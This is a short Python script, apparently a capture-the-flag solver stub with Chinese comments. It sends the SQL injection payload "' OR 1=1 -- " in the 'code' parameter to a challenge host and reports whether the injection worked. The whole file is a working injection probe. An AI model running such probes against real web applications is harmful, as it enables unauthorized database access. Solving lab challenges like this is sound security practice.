import requests

url = "http://challenge.cyclens.tech:31542/index.php"   # 请替换为实际地址

def query(payload):
    r = requests.get(url, params={"code": payload})
    # 调试输出
    print(f"[DEBUG] status={r.status_code}, text={r.text[:200]}")
    if r.status_code != 200:
        raise Exception(f"HTTP {r.status_code}")
    return r.json()["found"]

# 测试注入
if query("' OR 1=1 -- "):
    print("注入成功")
else:
    print("注入失败")
    exit()